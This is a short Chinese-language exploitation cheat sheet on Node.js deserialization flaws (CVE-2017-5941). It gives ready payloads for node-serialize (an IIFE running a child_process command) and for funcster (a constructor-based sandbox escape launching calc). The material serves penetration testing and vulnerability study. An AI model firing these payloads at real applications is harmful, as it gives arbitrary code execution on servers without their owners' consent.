# Node 反序列化

## 摘要

* [利用](#exploit)
  * [node-serialize](#node-serialize)
  * [funcster](#funcster)
* [参考资料](#references)

## 利用

* 在Node源代码中查找：
  * `node-serialize`
  * `serialize-to-js`
  * `funcster`

### node-serialize

> 在Node.js的node-serialize包0.0.4版本中发现了一个问题。未信任的数据传入`unserialize()`函数可以通过传递一个带有立即执行函数表达式（IIFE）的JavaScript对象来利用，以实现任意代码执行。

1. 生成序列化的有效载荷

   ```js
   var y = {
       rce : function(){
           require('child_process').exec('ls /', function(error,
           stdout, stderr) { console.log(stdout) });
       },
   }
   var serialize = require('node-serialize');
   console.log("序列化:" + serialize.serialize(y));
   ```
   
2. 添加括号`()`以强制执行

   ```js
   {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}()"}
   ```

3. 发送有效载荷

### funcster

```js
{"rce":{"__js_function":"function(){CMD=\"cmd /c calc\";const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').exec(CMD,function(error,stdout,stderr){console.log(stdout)});}()"}}
```

## 参考资料

* [利用Node.js反序列化漏洞进行远程代码执行 (CVE-2017-5941) - Ajin Abraham](https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf)
* [NodeJS反序列化 - 2020年1月8日 - gonczor](https://blacksheephacks.pl/nodejs-deserialization/)
* [CVE-2017-5941 - 国家漏洞数据库 - 2017年2月9日](https://nvd.nist.gov/vuln/detail/CVE-2017-5941)